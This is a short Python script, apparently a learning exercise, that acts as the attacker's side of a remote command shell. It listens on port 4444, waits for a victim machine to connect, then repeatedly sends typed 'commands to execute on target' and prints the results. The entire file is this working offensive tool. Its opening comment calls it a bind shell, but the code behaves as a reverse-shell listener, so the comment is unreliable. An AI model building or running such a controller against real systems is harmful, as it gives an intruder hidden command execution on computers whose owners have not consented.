import socket, sys
#bind shell, hacker calls victim

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('10.211.55.5',4444)) #bind to this machine! 127.0.0.1 might work to? 
s.listen(0)
print('Starting listener... enter \'bye\' to close connection')
connection,address = s.accept() #address is tuple with address and port
#print(connection) #connection is the socket object with information about local address and remote address
print('Connection established with ' + str(address[0]) + ' on port ' + str(address[1]))
while True:
    cmd = input('Enter command to execute on target:')
    if cmd != 'bye':

        cmd = str(cmd).encode('utf-8')
        connection.send(cmd)
        result = connection.recv(1024)
        result = result.decode()
        print(result)
    else:
        print('Exit call received, closing connection')
        s.close()
        sys.exit()
    

























